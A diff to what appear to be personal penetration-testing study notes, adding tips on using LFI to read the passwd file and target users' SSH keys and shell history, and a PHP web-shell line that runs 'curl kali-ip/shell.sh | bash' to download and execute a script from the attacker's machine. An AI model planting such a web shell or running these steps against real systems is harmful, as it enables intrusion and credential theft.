@@ -76,6 +76,8 @@ other mistakes
 that may have creds.
 - if you have access to passwd file through lfi or something and you don't have anything. but wait you have something. you can pinpoint usernames from passwd file and target that user's sensitive files such ssh key and .bash history
 - if you encounter wordpress website, and admin:admin not working, then the first thing is to check plugins and themese vulnerability using curl command
+- "<?php system('curl kali-ip/shell.sh | bash'); ?>". this downloads from kali/shell.sh and | pipe means execute in the memory. so meaning download+Execute
+
 
 
 
